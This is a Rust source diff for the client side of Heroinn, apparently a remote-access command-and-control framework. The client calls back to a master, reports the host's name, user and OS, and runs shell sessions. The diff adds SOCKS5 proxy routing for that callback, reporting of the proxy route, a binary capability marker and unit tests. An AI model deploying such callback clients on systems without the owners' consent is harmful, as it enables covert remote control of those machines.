@@ -2,9 +2,9 @@
 use heroinn_util::{
     HEART_BEAT_TIME, HeroinnClientMsgID, HeroinnProtocol, HeroinnServerCommandID, SlaveDNA,
     cur_timestamp_secs,
-    dna::CONNECTION_INFO_FLAG,
-    packet::{Heartbeat, HostInfo, Message},
-    protocol::{Transport, TransportFactory},
+    dna::{CLIENT_CAPABILITY_MARKER, CONNECTION_INFO_FLAG},
+    packet::{Heartbeat, HostInfo, Message, ProxyDisplay},
+    protocol::{RouteReport, Transport, TransportFactory},
     session::{ClientSession, SessionBase, SessionManager},
 };
 use std::{
@@ -29,6 +29,49 @@ static G_CONNECTION_INFO: SlaveDNA = SlaveDNA {
     size: [0u8; 8],
     data: [0u8; 1024],
 };
+
+#[used]
+#[unsafe(no_mangle)]
+static HEROINN_CLIENT_CAPABILITIES: [u8; CLIENT_CAPABILITY_MARKER.len()] = CLIENT_CAPABILITY_MARKER;
+
+fn display_proxy_endpoint(endpoint: &str, source: Option<String>) -> ProxyDisplay {
+    let (protocol, address) = endpoint
+        .split_once("://")
+        .map(|(protocol, address)| (protocol.to_ascii_uppercase(), address.to_string()))
+        .unwrap_or_else(|| (endpoint.to_ascii_uppercase(), String::new()));
+    ProxyDisplay {
+        protocol,
+        address,
+        source,
+    }
+}
+
+fn system_proxy_display(route: &RouteReport) -> ProxyDisplay {
+    let source = route.system_source.map(|source| source.to_string());
+    if let Some(endpoint) = &route.system_proxy {
+        return display_proxy_endpoint(endpoint, source);
+    }
+    ProxyDisplay {
+        protocol: if route.system_bypassed {
+            "Bypassed".to_string()
+        } else {
+            "None".to_string()
+        },
+        address: String::new(),
+        source,
+    }
+}
+
+fn socks5_proxy_display(route: &RouteReport) -> ProxyDisplay {
+    match &route.socks5_proxy {
+        Some(endpoint) => display_proxy_endpoint(endpoint, Some("specified".to_string())),
+        None => ProxyDisplay {
+            protocol: "Disabled".to_string(),
+            address: String::new(),
+            source: None,
+        },
+    }
+}
 
 fn main() {
     let _ = diagnostics::init_logging();
@@ -59,9 +102,14 @@ fn main() {
     });
 
     let config = master_configure();
-    let transport_factory = Arc::new(TransportFactory::system());
-
-    log::debug!("master config : {:?}", config);
+    let transport_factory =
+        match TransportFactory::system_with_specified_socks5(config.socks5_proxy.as_ref()) {
+            Ok(factory) => Arc::new(factory),
+            Err(error) => {
+                diagnostics::report_connect_failure(&error);
+                return;
+            }
+        };
 
     loop {
         shell_session_mgr.lock().unwrap().close_all();
@@ -93,6 +141,7 @@ fn main() {
             };
 
         log::info!("connect success!");
+        let route_report = client.route_report().cloned().unwrap_or_default();
 
         let hostname = whoami::hostname().unwrap_or_else(|_| "UNKNOWN".to_string());
 
@@ -124,6 +173,8 @@ fn main() {
             os,
             whoami: whoami::username().unwrap_or_else(|_| "UNKNOWN".to_string()),
             remark: config.remark.clone(),
+            system_proxy: Some(system_proxy_display(&route_report)),
+            socks5_proxy: Some(socks5_proxy_display(&route_report)),
         };
 
         let buf = match Message::build(HeroinnClientMsgID::HostInfo.to_u8(), &clientid, hostinfo) {
@@ -367,5 +418,47 @@ fn main() {
                 None => {}
             }
         }
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use heroinn_util::protocol::proxy::ProxySource;
+
+    #[test]
+    fn route_displays_distinguish_none_bypassed_and_two_layer_routes() {
+        let direct = RouteReport::default();
+        assert_eq!(system_proxy_display(&direct).protocol, "None");
+        assert_eq!(socks5_proxy_display(&direct).protocol, "Disabled");
+
+        let bypassed = RouteReport {
+            system_bypassed: true,
+            system_source: Some(ProxySource::Environment),
+            socks5_proxy: Some("socks5://[::1]:1080".to_string()),
+            ..RouteReport::default()
+        };
+        assert_eq!(system_proxy_display(&bypassed).protocol, "Bypassed");
+        let specified = socks5_proxy_display(&bypassed);
+        assert_eq!(specified.protocol, "SOCKS5");
+        assert_eq!(specified.address, "[::1]:1080");
+
+        let chained = RouteReport {
+            system_proxy: Some("https://proxy.example:8443".to_string()),
+            system_source: Some(ProxySource::System),
+            socks5_proxy: Some("socks5://127.0.0.1:1080".to_string()),
+            ..RouteReport::default()
+        };
+        assert_eq!(system_proxy_display(&chained).protocol, "HTTPS");
+        assert_eq!(system_proxy_display(&chained).address, "proxy.example:8443");
+        assert_eq!(socks5_proxy_display(&chained).protocol, "SOCKS5");
+    }
+
+    #[test]
+    fn evidence_marker_is_present_in_the_client_image() {
+        assert_eq!(
+            HEROINN_CLIENT_CAPABILITIES,
+            heroinn_util::dna::CLIENT_CAPABILITY_MARKER
+        );
     }
 }
